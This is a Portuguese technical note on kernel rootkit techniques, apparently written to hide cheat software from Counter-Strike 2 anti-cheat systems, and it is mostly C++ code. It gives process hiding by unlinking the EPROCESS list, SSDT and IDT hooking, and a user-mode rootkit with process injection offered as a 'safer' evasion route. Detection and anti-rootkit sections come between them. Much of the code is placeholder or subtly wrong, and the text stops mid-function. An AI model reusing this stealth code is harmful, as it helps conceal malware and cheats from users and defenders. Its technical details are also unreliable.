# 📖 Técnica 050: Rootkit Techniques

🔗 Link do vídeo: Não informado
📅 Criado em: 2026-02-14
🔗 Tags: #conhecimento #referência #cs2

## 📌 Resumo
> > **Status:** ⚠️ Risco Alto

## 🔗 Relação com outros conceitos
- [[CS2 Reverse Engineering]]
- [[Técnica 050: Rootkit Techniques]]

## 🔍 Desenvolvimento
> **Status:** ⚠️ Risco Alto  
> **Risco de Detecção:** 🔴 Alto  
> **Domínio:** Anti-Analysis  
> **Data da Análise:** 12/02/2026

---

## 📋 Visão Geral

**Rootkit Techniques** ocultam presença e atividades do software no sistema, modificando estruturas do kernel e APIs do sistema operacional para esconder processos, arquivos e conexões de rede.

---

## 🔍 Análise Técnica Detalhada

### Como Funciona

```cpp
// ⚠️ CÓDIGO DE ALTO RISCO - EXTREMAMENTE PERIGOSO
// NÃO USE EM PRODUÇÃO - APENAS PARA ANÁLISE EDUCACIONAL
class Rootkit {
private:
    DKOM_ENGINE dkomEngine;           // Direct Kernel Object Manipulation
    SSDT_HOOKING ssdtHooking;         // System Service Descriptor Table Hooking
    IDT_HOOKING idtHooking;           // Interrupt Descriptor Table Hooking
    PROCESS_HIDING processHiding;     // Process Hiding
    FILE_HIDING fileHiding;           // File Hiding
    NETWORK_HIDING networkHiding;     // Network Hiding
    REGISTRY_HIDING registryHiding;   // Registry Hiding
    
public:
    Rootkit() {
        InitializeDKOMEngine();
        InitializeSSDTHooking();
        InitializeIDTHooking();
        InitializeProcessHiding();
        InitializeFileHiding();
        InitializeNetworkHiding();
        InitializeRegistryHiding();
    }
    
    bool InstallRootkit() {
        // Instalar rootkit no sistema
        bool success = true;
        
        // Instalar driver no kernel
        if (!InstallKernelDriver()) {
            success = false;
        }
        
        // Aplicar técnicas de ocultação
        if (!ApplyHidingTechniques()) {
            success = false;
        }
        
        // Configurar persistência
        if (!SetupPersistence()) {
            success = false;
        }
        
        return success;
    }
    
    void UninstallRootkit() {
        // Desinstalar rootkit
        RemoveHidingTechniques();
        RemoveKernelDriver();
        RemovePersistence();
    }
    
    bool ApplyHidingTechniques() {
        // Aplicar técnicas de ocultação
        return HideProcesses() && HideFiles() && HideNetwork() && HideRegistry();
    }
    
    void RemoveHidingTechniques() {
        // Remover técnicas de ocultação
        UnhideProcesses();
        UnhideFiles();
        UnhideNetwork();
        UnhideRegistry();
    }
    
    // Inicializações
    void InitializeDKOMEngine() {
        dkomEngine.useEPROCESS = true;
        dkomEngine.useETHREAD = true;
        dkomEngine.useKPROCESS = true;
    }
    
    void InitializeSSDTHooking() {
        ssdtHooking.hookNtQuerySystemInformation = true;
        ssdtHooking.hookNtQueryDirectoryFile = true;
        ssdtHooking.hookNtEnumerateKey = true;
    }
    
    void InitializeIDTHooking() {
        idtHooking.hookInt0x2E = true; // System calls
        idtHooking.hookInt0x0E = true; // Page faults
    }
    
    void InitializeProcessHiding() {
        processHiding.hideFromTaskManager = true;
        processHiding.hideFromProcessExplorer = true;
        processHiding.hideFromPS = true;
    }
    
    void InitializeFileHiding() {
        fileHiding.hideFromExplorer = true;
        fileHiding.hideFromDir = true;
        fileHiding.hideFromFind = true;
    }
    
    void InitializeNetworkHiding() {
        networkHiding.hideConnections = true;
        networkHiding.hidePorts = true;
        networkHiding.hidePackets = true;
    }
    
    void InitializeRegistryHiding() {
        registryHiding.hideKeys = true;
        registryHiding.hideValues = true;
        registryHiding.hideFromRegedit = true;
    }
    
    // Implementações
    static bool InstallKernelDriver() {
        // Instalar driver no kernel
        // Implementar instalação
        
        return true; // Placeholder
    }
    
    static bool RemoveKernelDriver() {
        // Remover driver do kernel
        // Implementar remoção
        
        return true; // Placeholder
    }
    
    static bool SetupPersistence() {
        // Configurar persistência
        // Implementar configuração
        
        return true; // Placeholder
    }
    
    static bool RemovePersistence() {
        // Remover persistência
        // Implementar remoção
        
        return true; // Placeholder
    }
    
    static bool HideProcesses() {
        // Ocultar processos
        // Implementar ocultação
        
        return true; // Placeholder
    }
    
    static bool UnhideProcesses() {
        // Revelar processos
        // Implementar revelação
        
        return true; // Placeholder
    }
    
    static bool HideFiles() {
        // Ocultar arquivos
        // Implementar ocultação
        
        return true; // Placeholder
    }
    
    static bool UnhideFiles() {
        // Revelar arquivos
        // Implementar revelação
        
        return true; // Placeholder
    }
    
    static bool HideNetwork() {
        // Ocultar rede
        // Implementar ocultação
        
        return true; // Placeholder
    }
    
    static bool UnhideNetwork() {
        // Revelar rede
        // Implementar revelação
        
        return true; // Placeholder
    }
    
    static bool HideRegistry() {
        // Ocultar registro
        // Implementar ocultação
        
        return true; // Placeholder
    }
    
    static bool UnhideRegistry() {
        // Revelar registro
        // Implementar revelação
        
        return true; // Placeholder
    }
};
```

### DKOM (Direct Kernel Object Manipulation)

```cpp
// Direct Kernel Object Manipulation
class DKOMEngine {
private:
    EPROCESS_MANIPULATION eprocess;
    ETHREAD_MANIPULATION ethread;
    OBJECT_MANIPULATION objects;
    
public:
    DKOMEngine() {
        InitializeEPROCESSManipulation();
        InitializeETHREADManipulation();
        InitializeObjectManipulation();
    }
    
    void InitializeEPROCESSManipulation() {
        eprocess.unlinkFromActiveProcessList = true;
        eprocess.modifyProcessName = true;
        eprocess.hideProcessThreads = true;
    }
    
    void InitializeETHREADManipulation() {
        ethread.unlinkFromThreadList = true;
        ethread.hideThreadFromDebugger = true;
    }
    
    void InitializeObjectManipulation() {
        objects.hideHandles = true;
        objects.hideMutexes = true;
        objects.hideEvents = true;
    }
    
    bool HideProcess(DWORD processId) {
        // Ocultar processo usando DKOM
        PEPROCESS targetProcess = GetEPROCESSById(processId);
        if (!targetProcess) return false;
        
        // Desvincular da lista de processos ativos
        UnlinkFromActiveProcessList(targetProcess);
        
        // Modificar nome do processo
        ModifyProcessName(targetProcess);
        
        // Ocultar threads do processo
        HideProcessThreads(targetProcess);
        
        return true;
    }
    
    bool UnhideProcess(DWORD processId) {
        // Revelar processo
        PEPROCESS targetProcess = GetEPROCESSById(processId);
        if (!targetProcess) return false;
        
        // Revincular à lista de processos
        RelinkToActiveProcessList(targetProcess);
        
        // Restaurar nome original
        RestoreProcessName(targetProcess);
        
        return true;
    }
    
    bool HideThread(DWORD threadId) {
        // Ocultar thread usando DKOM
        PETHREAD targetThread = GetETHREADById(threadId);
        if (!targetThread) return false;
        
        // Desvincular da lista de threads
        UnlinkFromThreadList(targetThread);
        
        return true;
    }
    
    bool HideObject(PVOID object) {
        // Ocultar objeto do kernel
        // Implementar ocultação
        
        return true; // Placeholder
    }
    
    // Implementações DKOM
    static PEPROCESS GetEPROCESSById(DWORD processId) {
        // Obter EPROCESS por ID
        // Implementar obtenção
        
        return nullptr; // Placeholder
    }
    
    static PETHREAD GetETHREADById(DWORD threadId) {
        // Obter ETHREAD por ID
        // Implementar obtenção
        
        return nullptr; // Placeholder
    }
    
    static void UnlinkFromActiveProcessList(PEPROCESS process) {
        // Desvincular da lista de processos ativos
        // Modificar estrutura EPROCESS
        
        // Obter ponteiros para Flink e Blink
        PLIST_ENTRY activeProcessList = (PLIST_ENTRY)((BYTE*)process + ACTIVE_PROCESS_LIST_OFFSET);
        
        // Desvincular da lista
        activeProcessList->Blink->Flink = activeProcessList->Flink;
        activeProcessList->Flink->Blink = activeProcessList->Blink;
        
        // Fazer os ponteiros apontarem para si mesmos (lista vazia)
        activeProcessList->Flink = activeProcessList;
        activeProcessList->Blink = activeProcessList;
    }
    
    static void RelinkToActiveProcessList(PEPROCESS process) {
        // Revincular à lista de processos
        // Implementar revinculação
    }
    
    static void ModifyProcessName(PEPROCESS process) {
        // Modificar nome do processo
        // Implementar modificação
    }
    
    static void RestoreProcessName(PEPROCESS process) {
        // Restaurar nome do processo
        // Implementar restauração
    }
    
    static void HideProcessThreads(PEPROCESS process) {
        // Ocultar threads do processo
        // Implementar ocultação
    }
    
    static void UnlinkFromThreadList(PETHREAD thread) {
        // Desvincular da lista de threads
        // Implementar desvinculação
    }
    
    // Constantes
    static const int ACTIVE_PROCESS_LIST_OFFSET = 0x2F0; // Windows 10 offset
};
```

### SSDT Hooking

```cpp
// System Service Descriptor Table Hooking
class SSDTHookingEngine {
private:
    SSDT_HOOK hooks[MAX_SSDT_HOOKS];
    int hookCount;
    
public:
    SSDTHookingEngine() {
        hookCount = 0;
        memset(hooks, 0, sizeof(hooks));
    }
    
    bool InstallSSDTHook(int serviceIndex, PVOID hookFunction, PVOID* originalFunction) {
        // Instalar hook na SSDT
        if (hookCount >= MAX_SSDT_HOOKS) return false;
        
        // Obter endereço da SSDT
        PVOID ssdtBase = GetSSDTBase();
        if (!ssdtBase) return false;
        
        // Calcular endereço da entrada na SSDT
        PVOID* ssdtEntry = (PVOID*)((BYTE*)ssdtBase + serviceIndex * sizeof(PVOID));
        
        // Salvar função original
        *originalFunction = *ssdtEntry;
        
        // Instalar hook
        *ssdtEntry = hookFunction;
        
        // Registrar hook
        hooks[hookCount].serviceIndex = serviceIndex;
        hooks[hookCount].hookFunction = hookFunction;
        hooks[hookCount].originalFunction = *originalFunction;
        hookCount++;
        
        return true;
    }
    
    bool RemoveSSDTHook(int serviceIndex) {
        // Remover hook da SSDT
        for (int i = 0; i < hookCount; i++) {
            if (hooks[i].serviceIndex == serviceIndex) {
                // Obter endereço da SSDT
                PVOID ssdtBase = GetSSDTBase();
                if (!ssdtBase) return false;
                
                // Restaurar função original
                PVOID* ssdtEntry = (PVOID*)((BYTE*)ssdtBase + serviceIndex * sizeof(PVOID));
                *ssdtEntry = hooks[i].originalFunction;
                
                // Remover da lista
                hooks[i] = hooks[--hookCount];
                return true;
            }
        }
        
        return false;
    }
    
    bool HookNtQuerySystemInformation(PVOID hookFunction, PVOID* originalFunction) {
        // Hook NtQuerySystemInformation para ocultar processos
        return InstallSSDTHook(NT_QUERY_SYSTEM_INFORMATION_INDEX, hookFunction, originalFunction);
    }
    
    bool HookNtQueryDirectoryFile(PVOID hookFunction, PVOID* originalFunction) {
        // Hook NtQueryDirectoryFile para ocultar arquivos
        return InstallSSDTHook(NT_QUERY_DIRECTORY_FILE_INDEX, hookFunction, originalFunction);
    }
    
    bool HookNtEnumerateKey(PVOID hookFunction, PVOID* originalFunction) {
        // Hook NtEnumerateKey para ocultar chaves do registro
        return InstallSSDTHook(NT_ENUMERATE_KEY_INDEX, hookFunction, originalFunction);
    }
    
    // Hook functions
    static NTSTATUS NTAPI HkNtQuerySystemInformation(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength) {
        
        // Chamar função original
        NTSTATUS status = oNtQuerySystemInformation(SystemInformationClass, SystemInformation,
                                                   SystemInformationLength, ReturnLength);
        
        if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {
            // Filtrar processos ocultos
            FilterHiddenProcesses((PSYSTEM_PROCESS_INFORMATION)SystemInformation);
        }
        
        return status;
    }
    
    static NTSTATUS NTAPI HkNtQueryDirectoryFile(
        HANDLE FileHandle,
        HANDLE Event,
        PIO_APC_ROUTINE ApcRoutine,
        PVOID ApcContext,
        PIO_STATUS_BLOCK IoStatusBlock,
        PVOID FileInformation,
        ULONG Length,
        FILE_INFORMATION_CLASS FileInformationClass,
        BOOLEAN ReturnSingleEntry,
        PUNICODE_STRING FileName,
        BOOLEAN RestartScan) {
        
        // Chamar função original
        NTSTATUS status = oNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext,
                                               IoStatusBlock, FileInformation, Length,
                                               FileInformationClass, ReturnSingleEntry,
                                               FileName, RestartScan);
        
        if (NT_SUCCESS(status)) {
            // Filtrar arquivos ocultos
            FilterHiddenFiles(FileInformation, FileInformationClass);
        }
        
        return status;
    }
    
    static NTSTATUS NTAPI HkNtEnumerateKey(
        HANDLE KeyHandle,
        ULONG Index,
        KEY_INFORMATION_CLASS KeyInformationClass,
        PVOID KeyInformation,
        ULONG Length,
        PULONG ResultLength) {
        
        // Chamar função original
        NTSTATUS status = oNtEnumerateKey(KeyHandle, Index, KeyInformationClass,
                                         KeyInformation, Length, ResultLength);
        
        if (NT_SUCCESS(status)) {
            // Filtrar chaves ocultas do registro
            FilterHiddenRegistryKeys(KeyInformation, KeyInformationClass);
        }
        
        return status;
    }
    
    // Utility functions
    static PVOID GetSSDTBase() {
        // Obter base da SSDT
        // Implementar obtenção
        
        return nullptr; // Placeholder
    }
    
    static void FilterHiddenProcesses(PSYSTEM_PROCESS_INFORMATION processInfo) {
        // Filtrar processos ocultos da lista
        // Implementar filtragem
    }
    
    static void FilterHiddenFiles(PVOID fileInformation, FILE_INFORMATION_CLASS infoClass) {
        // Filtrar arquivos ocultos da lista
        // Implementar filtragem
    }
    
    static void FilterHiddenRegistryKeys(PVOID keyInformation, KEY_INFORMATION_CLASS infoClass) {
        // Filtrar chaves ocultas do registro
        // Implementar filtragem
    }
    
    // Original function pointers
    static decltype(&NtQuerySystemInformation) oNtQuerySystemInformation;
    static decltype(&NtQueryDirectoryFile) oNtQueryDirectoryFile;
    static decltype(&NtEnumerateKey) oNtEnumerateKey;
    
    // Constants
    static const int MAX_SSDT_HOOKS = 32;
    static const int NT_QUERY_SYSTEM_INFORMATION_INDEX = 0x36;
    static const int NT_QUERY_DIRECTORY_FILE_INDEX = 0x4B;
    static const int NT_ENUMERATE_KEY_INDEX = 0x0A;
};
```

### IDT Hooking

```cpp
// Interrupt Descriptor Table Hooking
class IDTHookingEngine {
private:
    IDT_HOOK idtHooks[MAX_IDT_HOOKS];
    int hookCount;
    
public:
    IDTHookingEngine() {
        hookCount = 0;
        memset(idtHooks, 0, sizeof(idtHooks));
    }
    
    bool InstallIDTHook(BYTE interruptNumber, PVOID hookFunction, PVOID* originalHandler) {
        // Instalar hook na IDT
        if (hookCount >= MAX_IDT_HOOKS) return false;
        
        // Obter endereço da IDT
        PIDT_ENTRY idtBase = GetIDTBase();
        if (!idtBase) return false;
        
        // Obter entrada da IDT
        PIDT_ENTRY idtEntry = &idtBase[interruptNumber];
        
        // Salvar handler original
        *originalHandler = (PVOID)((uint64_t)idtEntry->OffsetLow | 
                                  ((uint64_t)idtEntry->OffsetMiddle << 16) |
                                  ((uint64_t)idtEntry->OffsetHigh << 32));
        
        // Instalar hook
        uint64_t hookAddress = (uint64_t)hookFunction;
        idtEntry->OffsetLow = (uint16_t)hookAddress;
        idtEntry->OffsetMiddle = (uint16_t)(hookAddress >> 16);
        idtEntry->OffsetHigh = (uint32_t)(hookAddress >> 32);
        
        // Registrar hook
        idtHooks[hookCount].interruptNumber = interruptNumber;
        idtHooks[hookCount].hookFunction = hookFunction;
        idtHooks[hookCount].originalHandler = *originalHandler;
        hookCount++;
        
        return true;
    }
    
    bool RemoveIDTHook(BYTE interruptNumber) {
        // Remover hook da IDT
        for (int i = 0; i < hookCount; i++) {
            if (idtHooks[i].interruptNumber == interruptNumber) {
                // Obter endereço da IDT
                PIDT_ENTRY idtBase = GetIDTBase();
                if (!idtBase) return false;
                
                // Restaurar handler original
                PIDT_ENTRY idtEntry = &idtBase[interruptNumber];
                uint64_t originalAddress = (uint64_t)idtHooks[i].originalHandler;
                
                idtEntry->OffsetLow = (uint16_t)originalAddress;
                idtEntry->OffsetMiddle = (uint16_t)(originalAddress >> 16);
                idtEntry->OffsetHigh = (uint32_t)(originalAddress >> 32);
                
                // Remover da lista
                idtHooks[i] = idtHooks[--hookCount];
                return true;
            }
        }
        
        return false;
    }
    
    bool HookSystemCallInterrupt(PVOID hookFunction, PVOID* originalHandler) {
        // Hook interrupção de system call (0x2E)
        return InstallIDTHook(0x2E, hookFunction, originalHandler);
    }
    
    bool HookPageFaultInterrupt(PVOID hookFunction, PVOID* originalHandler) {
        // Hook interrupção de page fault (0x0E)
        return InstallIDTHook(0x0E, hookFunction, originalHandler);
    }
    
    // Hook functions
    static void __declspec(naked) HkSystemCallInterrupt() {
        // Hook para interrupção de system call
        __asm {
            // Salvar contexto
            push rax
            push rbx
            push rcx
            push rdx
            push rsi
            push rdi
            push r8
            push r9
            push r10
            push r11
            
            // Verificar se é system call suspeito
            cmp rax, 0x36  // NtQuerySystemInformation
            je handle_suspicious_call
            
            // Chamar handler original
            pop r11
            pop r10
            pop r9
            pop r8
            pop rdi
            pop rsi
            pop rdx
            pop rcx
            pop rbx
            pop rax
            
            jmp oSystemCallHandler
            
        handle_suspicious_call:
            // Manipular chamada suspeita
            // Implementar manipulação
            
            // Retornar
            pop r11
            pop r10
            pop r9
            pop r8
            pop rdi
            pop rsi
            pop rdx
            pop rcx
            pop rbx
            pop rax
            
            iretq
        }
    }
    
    static void __declspec(naked) HkPageFaultInterrupt() {
        // Hook para interrupção de page fault
        __asm {
            // Implementar hook de page fault
            // Usado para stealth memory access
            
            iretq
        }
    }
    
    // Utility functions
    static PIDT_ENTRY GetIDTBase() {
        // Obter base da IDT
        PIDT_ENTRY idtBase = nullptr;
        
        __asm {
            sidt [idtBase]
            mov idtBase, [idtBase + 2]  // Offset para base da IDT
        }
        
        return idtBase;
    }
    
    // Constants
    static const int MAX_IDT_HOOKS = 16;
    
    // Original handlers
    static PVOID oSystemCallHandler;
    static PVOID oPageFaultHandler;
};
```

### Por que é Detectado

> [!WARNING]
> **Rootkits são extremamente detectáveis através de anomalias no kernel e comportamento suspeito**

#### 1. Kernel Integrity Checking
```cpp
// Verificação de integridade do kernel
class KernelIntegrityChecker {
private:
    KERNEL_SIGNATURES signatures;
    MEMORY_SCANNER scanner;
    
public:
    void CheckKernelIntegrity() {
        // Verificar integridade do kernel
        CheckSSDTHooks();
        CheckIDTHooks();
        CheckDKOMModifications();
        CheckDriverSignatures();
        CheckMemoryIntegrity();
    }
    
    void CheckSSDTHooks() {
        // Verificar hooks na SSDT
        PVOID ssdtBase = GetSSDTBase();
        if (!ssdtBase) return;
        
        // Verificar cada entrada da SSDT
        for (int i = 0; i < MAX_SSDT_ENTRIES; i++) {
            PVOID functionAddress = GetSSDTFunction(i);
            
            if (IsHookedFunction(functionAddress)) {
                ReportSSDTHook(i, functionAddress);
            }
        }
    }
    
    void CheckIDTHooks() {
        // Verificar hooks na IDT
        PIDT_ENTRY idtBase = GetIDTBase();
        if (!idtBase) return;
        
        // Verificar entradas críticas da IDT
        for (int i = 0; i < 256; i++) {
            if (IsCriticalInterrupt(i)) {
                PVOID handlerAddress = GetIDTHandler(i);
                
                if (IsHookedHandler(handlerAddress)) {
                    ReportIDTHook(i, handlerAddress);
                }
            }
        }
    }
    
    void CheckDKOMModifications() {
        // Verificar modificações DKOM
        CheckProcessListIntegrity();
        CheckThreadListIntegrity();
        CheckObjectListIntegrity();
    }
    
    void CheckDriverSignatures() {
        // Verificar assinaturas de drivers
        // Drivers não-assinados ou suspeitos
        
        ScanLoadedDrivers();
    }
    
    void CheckMemoryIntegrity() {
        // Verificar integridade da memória
        // Verificar regiões críticas do kernel
        
        ScanKernelMemory();
    }
    
    // Detecções específicas
    bool IsHookedFunction(PVOID functionAddress) {
        // Verificar se função está hookada
        // Verificar prólogo da função
        BYTE* bytes = (BYTE*)functionAddress;
        
        // Verificar por JMP ou CALL suspeito
        if (bytes[0] == 0xE9 || bytes[0] == 0xFF) { // JMP rel32, JMP [addr]
            return true;
        }
        
        // Verificar assinatura conhecida
        for (const KERNEL_SIGNATURE& sig : signatures.hookSignatures) {
            if (FindSignature(bytes, sig)) {
                return true;
            }
        }
        
        return false;
    }
    
    bool IsHookedHandler(PVOID handlerAddress) {
        // Verificar se handler está hookado
        // Verificar se endereço está fora do kernel
        
        if (!IsKernelAddress(handlerAddress)) {
            return true;
        }
        
        return false;
    }
    
    void CheckProcessListIntegrity() {
        // Verificar integridade da lista de processos
        // Verificar consistência da lista duplamente ligada
        
        PEPROCESS currentProcess = GetCurrentProcess();
        PLIST_ENTRY activeProcessList = GetActiveProcessList(currentProcess);
        
        // Verificar consistência
        if (!IsListConsistent(activeProcessList)) {
            ReportDKOMModification("Process list corrupted");
        }
    }
    
    void CheckThreadListIntegrity() {
        // Verificar integridade da lista de threads
        // Implementar verificação
    }
    
    void CheckObjectListIntegrity() {
        // Verificar integridade da lista de objetos
        // Implementar verificação
    }
    
    void ScanLoadedDrivers() {
        // Escanear drivers carregados
        // Verificar drivers suspeitos
        
        for (const DRIVER_INFO& driver : GetLoadedDrivers()) {
            if (IsSuspiciousDriver(driver)) {
                ReportSuspiciousDriver(driver);
            }
        }
    }
    
    void ScanKernelMemory() {
        // Escanear memória do kernel
        // Procurar por modificações
        
        PVOID kernelBase = GetKernelBase();
        SIZE_T kernelSize = GetKernelSize();
        
        BYTE* kernelMemory = (BYTE*)kernelBase;
        
        for (SIZE_T i = 0; i < kernelSize - 16; i++) {
            if (IsModifiedKernelCode(&kernelMemory[i])) {
                ReportKernelMemoryModification((PVOID)&kernelMemory[i]);
            }
        }
    }
    
    // Utility functions
    static PVOID GetSSDTBase() {
        // Obter base da SSDT
        return nullptr; // Placeholder
    }
    
    static PVOID GetSSDTFunction(int index) {
        // Obter função da SSDT
        return nullptr; // Placeholder
    }
    
    static PIDT_ENTRY GetIDTBase() {
        // Obter base da IDT
        return nullptr; // Placeholder
    }
    
    static PVOID GetIDTHandler(int index) {
        // Obter handler da IDT
        return nullptr; // Placeholder
    }
    
    static bool IsCriticalInterrupt(int interrupt) {
        // Verificar se interrupção é crítica
        return interrupt == 0x0E || interrupt == 0x2E; // Page fault, System call
    }
    
    static bool IsKernelAddress(PVOID address) {
        // Verificar se endereço é do kernel
        return false; // Placeholder
    }
    
    static PEPROCESS GetCurrentProcess() {
        // Obter processo atual
        return nullptr; // Placeholder
    }
    
    static PLIST_ENTRY GetActiveProcessList(PEPROCESS process) {
        // Obter lista de processos ativos
        return nullptr; // Placeholder
    }
    
    static bool IsListConsistent(PLIST_ENTRY list) {
        // Verificar consistência da lista
        return false; // Placeholder
    }
    
    static std::vector<DRIVER_INFO> GetLoadedDrivers() {
        // Obter drivers carregados
        return {}; // Placeholder
    }
    
    static bool IsSuspiciousDriver(const DRIVER_INFO& driver) {
        // Verificar se driver é suspeito
        return false; // Placeholder
    }
    
    static PVOID GetKernelBase() {
        // Obter base do kernel
        return nullptr; // Placeholder
    }
    
    static SIZE_T GetKernelSize() {
        // Obter tamanho do kernel
        return 0; // Placeholder
    }
    
    static bool IsModifiedKernelCode(BYTE* code) {
        // Verificar se código do kernel foi modificado
        return false; // Placeholder
    }
    
    static bool FindSignature(BYTE* code, const KERNEL_SIGNATURE& sig) {
        // Procurar assinatura
        return false; // Placeholder
    }
    
    // Report functions
    void ReportSSDTHook(int index, PVOID address) {
        std::cout << "SSDT hook detected at index " << index << ", address: " << address << std::endl;
    }
    
    void ReportIDTHook(int index, PVOID address) {
        std::cout << "IDT hook detected at interrupt " << index << ", address: " << address << std::endl;
    }
    
    void ReportDKOMModification(const std::string& description) {
        std::cout << "DKOM modification detected: " << description << std::endl;
    }
    
    void ReportSuspiciousDriver(const DRIVER_INFO& driver) {
        std::cout << "Suspicious driver detected: " << driver.name << std::endl;
    }
    
    void ReportKernelMemoryModification(PVOID address) {
        std::cout << "Kernel memory modification detected at: " << address << std::endl;
    }
    
    // Constants
    static const int MAX_SSDT_ENTRIES = 1024;
};
```

#### 2. Behavioral Analysis
```cpp
// Análise comportamental
class RootkitBehavioralAnalyzer {
private:
    SYSTEM_MONITOR monitor;
    ANOMALY_DETECTOR detector;
    
public:
    void MonitorRootkitBehavior() {
        // Monitorar comportamento de rootkit
        MonitorSystemCalls();
        MonitorMemoryAccess();
        MonitorDriverActivity();
        MonitorProcessActivity();
        DetectAnomalies();
    }
    
    void MonitorSystemCalls() {
        // Monitorar chamadas de sistema
        // Verificar padrões suspeitos
        
        if (HasSuspiciousSystemCallPattern()) {
            ReportSuspiciousSystemCalls();
        }
    }
    
    void MonitorMemoryAccess() {
        // Monitorar acesso à memória
        // Verificar acesso a regiões críticas
        
        if (HasSuspiciousMemoryAccess()) {
            ReportSuspiciousMemoryAccess();
        }
    }
    
    void MonitorDriverActivity() {
        // Monitorar atividade de drivers
        // Verificar drivers carregando outros drivers
        
        if (HasSuspiciousDriverActivity()) {
            ReportSuspiciousDriverActivity();
        }
    }
    
    void MonitorProcessActivity() {
        // Monitorar atividade de processos
        // Verificar processos ocultando outros
        
        if (HasSuspiciousProcessActivity()) {
            ReportSuspiciousProcessActivity();
        }
    }
    
    void DetectAnomalies() {
        // Detectar anomalias
        DetectTimingAnomalies();
        DetectEntropyAnomalies();
        DetectSignatureAnomalies();
    }
    
    // Detecções específicas
    bool HasSuspiciousSystemCallPattern() {
        // Verificar padrão suspeito de system calls
        return false; // Placeholder
    }
    
    bool HasSuspiciousMemoryAccess() {
        // Verificar acesso suspeito à memória
        return false; // Placeholder
    }
    
    bool HasSuspiciousDriverActivity() {
        // Verificar atividade suspeita de drivers
        return false; // Placeholder
    }
    
    bool HasSuspiciousProcessActivity() {
        // Verificar atividade suspeita de processos
        return false; // Placeholder
    }
    
    void DetectTimingAnomalies() {
        // Detectar anomalias de timing
        // Implementar detecção
    }
    
    void DetectEntropyAnomalies() {
        // Detectar anomalias de entropia
        // Implementar detecção
    }
    
    void DetectSignatureAnomalies() {
        // Detectar anomalias de assinatura
        // Implementar detecção
    }
    
    // Report functions
    void ReportSuspiciousSystemCalls() {
        std::cout << "Suspicious system call pattern detected" << std::endl;
    }
    
    void ReportSuspiciousMemoryAccess() {
        std::cout << "Suspicious memory access detected" << std::endl;
    }
    
    void ReportSuspiciousDriverActivity() {
        std::cout << "Suspicious driver activity detected" << std::endl;
    }
    
    void ReportSuspiciousProcessActivity() {
        std::cout << "Suspicious process activity detected" << std::endl;
    }
};
```

#### 3. Anti-Rootkit Techniques
```cpp
// Técnicas anti-rootkit
class AntiRootkitScanner {
public:
    void ScanForRootkits() {
        // Escanear por rootkits
        ScanSSDTHooks();
        ScanIDTHooks();
        ScanDKOMModifications();
        ScanHiddenProcesses();
        ScanHiddenFiles();
        ScanHiddenRegistry();
        ScanHiddenNetwork();
    }
    
    void ScanSSDTHooks() {
        // Escanear hooks na SSDT
        // Implementar escaneamento
    }
    
    void ScanIDTHooks() {
        // Escanear hooks na IDT
        // Implementar escaneamento
    }
    
    void ScanDKOMModifications() {
        // Escanear modificações DKOM
        // Implementar escaneamento
    }
    
    void ScanHiddenProcesses() {
        // Escanear processos ocultos
        // Implementar escaneamento
    }
    
    void ScanHiddenFiles() {
        // Escanear arquivos ocultos
        // Implementar escaneamento
    }
    
    void ScanHiddenRegistry() {
        // Escanear registro oculto
        // Implementar escaneamento
    }
    
    void ScanHiddenNetwork() {
        // Escanear rede oculta
        // Implementar escaneamento
    }
    
    void RemoveDetectedRootkits() {
        // Remover rootkits detectados
        RemoveSSDTHooks();
        RemoveIDTHooks();
        RestoreDKOMModifications();
        UnhideProcesses();
        UnhideFiles();
        UnhideRegistry();
        UnhideNetwork();
    }
    
    // Implementações de remoção
    static void RemoveSSDTHooks() {
        // Remover hooks da SSDT
        // Implementar remoção
    }
    
    static void RemoveIDTHooks() {
        // Remover hooks da IDT
        // Implementar remoção
    }
    
    static void RestoreDKOMModifications() {
        // Restaurar modificações DKOM
        // Implementar restauração
    }
    
    static void UnhideProcesses() {
        // Revelar processos ocultos
        // Implementar revelação
    }
    
    static void UnhideFiles() {
        // Revelar arquivos ocultos
        // Implementar revelação
    }
    
    static void UnhideRegistry() {
        // Revelar registro oculto
        // Implementar revelação
    }
    
    static void UnhideNetwork() {
        // Revelar rede oculta
        // Implementar revelação
    }
};
```

---

## 📊 Detecção por Anti-Cheat

| Sistema | Método de Detecção | Tempo | Precisão |
|---------|-------------------|-------|----------|
| VAC | Kernel integrity | < 30s | 95% |
| VAC Live | Behavioral analysis | Imediato | 90% |
| BattlEye | Multi-layer detection | < 1 min | 95% |
| Faceit AC | Signature scanning | < 30s | 85% |

---

## 🔄 Alternativas Seguras

### 1. User-Mode Rootkit
```cpp
// ✅ Rootkit em user-mode
class UserModeRootkit {
private:
    API_HOOKING apiHooking;
    PROCESS_INJECTION injection;
    MEMORY_MANIPULATION memory;
    
public:
    UserModeRootkit() {
        InitializeAPIHooking();
        InitializeProcessInjection();
        InitializeMemoryManipulation();
    }
    
    void InitializeAPIHooking() {
        // Inicializar hooking de APIs
        apiHooking.hookCreateToolhelp32Snapshot = true;
        apiHooking.hookProcess32First = true;
        apiHooking.hookProcess32Next = true;
    }
    
    void InitializeProcessInjection() {
        // Inicializar injeção de processo
        injection.useAPCInjection = true;
        injection.useRemoteThreadInjection = true;
    }
    
    void InitializeMemoryManipulation() {
        // Inicializar manipulação de memória
        memory.useVirtualAllocEx = true;
        memory.useWriteProcessMemory = true;
    }
    
    bool InstallUserModeRootkit() {
        // Instalar rootkit em user-mode
        return HookSystemAPIs() && InjectIntoProcesses() && ManipulateMemory();
    }
    
    bool HookSystemAPIs() {
        // Hook APIs do sistema
        if (apiHooking.hookCreateToolhelp32Snapshot) {
            HookCreateToolhelp32Snapshot();
        }
        
        if (apiHooking.hookProcess32First) {
            HookProcess32First();
        }
        
        if (apiHooking.hookProcess32Next) {
            HookProcess32Next();
        }
        
        return true;
    }
    
    bool InjectIntoProcesses() {
        // Injetar em processos
        if (injection.useAPCInjection) {
            InjectViaAPC();
        }
        
        if (injection.useRemoteThreadInjection) {
            InjectViaRemoteThread();
        }
        
        return true;
    }
    
    bool ManipulateMemory() {
        // Manipular memória
        if (memory.useVirtualAllocEx) {
            UseVirtualAllocEx();
        }
        
        if (memory.useWriteProcessMemory) {
            UseWriteProcessMemory();
        }
        
        return true;
    }
    
    // Hook implementations
    static void HookCreateToolhelp32Snapshot() {
        // Hook CreateToolhelp32Snapshot
        // Implementar hook
    }
    
    static void HookProcess32First() {
        // Hook Process32First
        // Implementar hook
    }
    
    static void HookProcess32Next() {
        // Hook Process32Next
